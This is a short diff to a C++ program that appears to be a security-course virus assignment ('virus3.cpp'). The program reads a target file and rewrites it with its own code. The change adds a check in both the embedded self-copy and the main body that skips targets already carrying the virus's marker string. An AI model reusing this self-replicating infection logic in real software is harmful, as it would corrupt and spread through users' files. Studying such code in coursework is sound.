@@ -54,6 +54,12 @@ std::string exec = "    if (argc < 1) {\n\
     \n\
     fs.close();\n\
     \n\
+    std::string s = ss.str();\n\
+    if (s.find(\"COMP3632 Assignment 1 virus3.cpp\") != std::string::npos) {\n\
+	std::cout << \"Target already infected, boo :(\" << std::endl;\n\
+	return 1;\n\
+    }\n\
+    \n\
     fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\
     \n\
     if (!fs.is_open()) {\n\
@@ -122,6 +128,12 @@ int main (int argc, char** argv) {
     ss << fs.rdbuf();
 
     fs.close();
+
+    std::string s = ss.str();
+    if (s.find("COMP3632 Assignment 1 virus3.cpp") != std::string::npos) {
+	std::cout << "Target already infected, boo :(" << std::endl;
+	return 1;
+    }
     
     fs.open(argv[1], std::fstream::out | std::fstream::trunc);
     
